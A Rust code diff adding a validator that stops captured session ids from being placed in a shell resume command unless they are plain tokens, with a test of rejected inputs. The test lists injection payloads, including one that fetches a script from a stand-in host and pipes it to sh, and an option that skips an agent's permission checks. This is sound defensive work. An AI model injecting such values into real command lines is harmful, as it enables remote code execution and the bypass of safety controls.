@@ -417,11 +417,32 @@ impl AdapterState {
     }
 }
 
+/// Whether a captured value may be placed in a command line.
+///
+/// Captures come from outside the app — the loopback hook endpoint, terminal
+/// output, saved pane metadata — and a resume command is typed into the
+/// pane's shell. Only a plain token (an id, a path-like name) is ever
+/// needed, so anything a shell would interpret, or that would read as an
+/// option, is not a capture.
+pub(crate) fn is_safe_capture(value: &str) -> bool {
+    !value.is_empty()
+        && value.len() <= 256
+        && !value.starts_with('-')
+        && value
+            .bytes()
+            .all(|b| b.is_ascii_alphanumeric() || b"_-.:@/+=,".contains(&b))
+}
+
 /// Replace `{key}` placeholders in a template with captured values.
+///
+/// A value that is not [`is_safe_capture`] is skipped, which leaves its
+/// placeholder unresolved — the same as never having captured it.
 fn substitute_placeholders(template: &str, captures: &HashMap<String, String>) -> String {
     let mut result = template.to_string();
     for (key, value) in captures {
-        result = result.replace(&format!("{{{key}}}"), value);
+        if is_safe_capture(value) {
+            result = result.replace(&format!("{{{key}}}"), value);
+        }
     }
     result
 }
@@ -692,6 +713,34 @@ mod tests {
             .build_resume_command("claude-code", &HashMap::new())
             .unwrap();
         assert_eq!(cmd, "--resume {claude_session_id}");
+    }
+
+    #[test]
+    fn a_capture_the_shell_would_interpret_is_never_substituted() {
+        let state = AdapterState {
+            scanners: Arc::new(Mutex::new(HashMap::new())),
+            config: Arc::new(Mutex::new(default_config())),
+        };
+
+        for hostile in [
+            "x;curl${IFS}https://evil/p|sh",
+            "x y",
+            "$(id)",
+            "`id`",
+            "x\ny",
+            "x&y",
+            "'x'",
+            "--dangerously-skip-permissions",
+            "",
+        ] {
+            let mut caps = HashMap::new();
+            caps.insert("claude_session_id".to_string(), hostile.to_string());
+            let m = state.get_adapter_match("claude-code", &caps).unwrap();
+            assert_eq!(m.resume_args.as_deref(), Some("--continue"), "capture: {hostile:?}");
+        }
+
+        assert!(is_safe_capture("0b0f6a5e-8d0c-4f0e-9c56-2f1d7c1a9e11"));
+        assert!(is_safe_capture("ses_01HZX.abc:1"));
     }
 
     #[test]
